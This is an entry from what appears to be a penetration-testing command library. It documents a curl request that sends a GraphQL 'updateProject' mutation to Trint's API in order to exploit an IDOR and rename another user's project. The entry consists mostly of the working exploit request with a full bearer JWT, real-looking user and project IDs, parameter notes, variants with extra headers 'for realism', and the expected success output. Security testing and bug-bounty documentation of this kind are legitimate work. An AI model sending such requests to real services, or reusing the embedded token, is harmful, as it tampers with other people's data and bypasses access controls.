---
id: cmd-graphql-update-trint
data: >-
  curl -X POST https://graphql2.trint.com/ -H "Authorization: Bearer
  eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJodHRwczovL2FwcC50cmludC5jb20vaXNOZXdVc2VyIjp0cnVlLCJodHRwczovL2FwcC50cmludC5jb20vdXNlcklkIjoiNWNlNTAyYTIxZTFjYWY3NTBkNmM3ZjU5IiwiaXNzIjoiaHR0cHM6Ly90cmludC5hdXRoMC5jb20vIiwic3ViIjoiZmFjZWJvb2t8NTM5NjM3MDE2NTY4MjUxIiwiYXVkIjoiaWNoNGh5VllQS0tnZUVvVGg2ZldQWGM2ZnJ2ZVRjVHEiLCJpYXQiOjE1NTg1MTIyOTYsImV4cCI6MTU2MDg3Mjg4MH0.umWI5RJnC3bO1NbP5TFI0A37H182U7J0WC3d_5W0xLc"
  -H "Content-Type: application/json" -H "User-Agent: Mozilla/5.0 (Windows NT
  10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0" -d
  '{"operationName":"updateProject","variables":{"userId":"5ce502a21e1caf750d6c7f59","projectName":"abctesthorizontal","projectId":"i2lu5qZVTwWnQQhPp_g8Ig"},"query":"mutation
  updateProject($userId: String!, $projectName: String!, $projectId: String!) {
  updateProject(userId: $userId, projectName: $projectName, projectId:
  $projectId) { ...RenameProjectFragment __typename } } fragment
  RenameProjectFragment on Project { _id projectName updated __typename }"}'
tags:
  - graphql
  - mutation
  - idor
type: command
output: >-
  {"data":{"updateProject":{"_id":"i2lu5qZVTwWnQQhPp_g8Ig","projectName":"abctesthorizontal","updated":"2019-05-20T...","__typename":"Project"}},"extensions":{}}
executor: bash
platforms:
  - Web
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:25:29.860Z'
verified: false
validated: true
submitted: true
---
# graphql-update-project-mutation

## Command

```bash
curl -X POST https://graphql2.trint.com/ \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJodHRwczovL2FwcC50cmludC5jb20vaXNOZXdVc2VyIjp0cnVlLCJodHRwczovL2FwcC50cmludC5jb20vdXNlcklkIjoiNWNlNTAyYTIxZTFjYWY3NTBkNmM3ZjU5IiwiaXNzIjoiaHR0cHM6Ly90cmludC5hdXRoMC5jb20vIiwic3ViIjoiZmFjZWJvb2t8NTM5NjM3MDE2NTY4MjUxIiwiYXVkIjoiaWNoNGh5VllQS0tnZUVvVGg2ZldQWGM2ZnJ2ZVRjVHEiLCJpYXQiOjE1NTg1MTIyOTYsImV4cCI6MTU2MDg3Mjg4MH0.umWI5RJnC3bO1NbP5TFI0A37H182U7J0WC3d_5W0xLc" \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0" \
  -d '{"operationName":"updateProject","variables":{"userId":"5ce502a21e1caf750d6c7f59","projectName":"abctesthorizontal","projectId":"i2lu5qZVTwWnQQhPp_g8Ig"},"query":"mutation updateProject($userId: String!, $projectName: String!, $projectId: String!) { updateProject(userId: $userId, projectName: $projectName, projectId: $projectId) { ...RenameProjectFragment __typename } } fragment RenameProjectFragment on Project { _id projectName updated __typename }"}'
```

## Description

This command executes a GraphQL mutation to update a project name in the Trint API, exploiting IDOR by using another user's projectId. Use it in authenticated sessions to test for broken access controls in GraphQL endpoints.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `https://graphql2.trint.com/` | Target GraphQL endpoint | Yes |
| `-H "Authorization: Bearer [JWT]"` | JWT token for authentication | Yes |
| `-H "Content-Type: application/json"` | Sets JSON payload type | Yes |
| `-d '{...}'` | JSON payload with operationName, variables (userId, projectName, projectId), and query | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://graphql2.trint.com/ -H "Authorization: Bearer [JWT]" -H "Content-Type: application/json" -d '{...}'
```

### Advanced Usage

Modify variables for different projectIds or names; include additional headers like Referer or X-Trint-Request-Id for realism.

```bash
curl -X POST https://graphql2.trint.com/ \
  -H "Authorization: Bearer [JWT]" \
  -H "Content-Type: application/json" \
  -H "Referer: https://app.trint.com/trints" \
  -d '{... with custom projectId}'
```

## Expected Output

Successful execution returns a JSON response confirming the update, such as {"data":{"updateProject":{"projectName":"abctesthorizontal"}}}. Errors may include GraphQL validation failures or, post-fix, authorization denials like 'You are not authorized to access this data'.

## Related

- [[Related Procedure: Exploit-IDOR-in-GraphQL-updateProject-Mutation]]
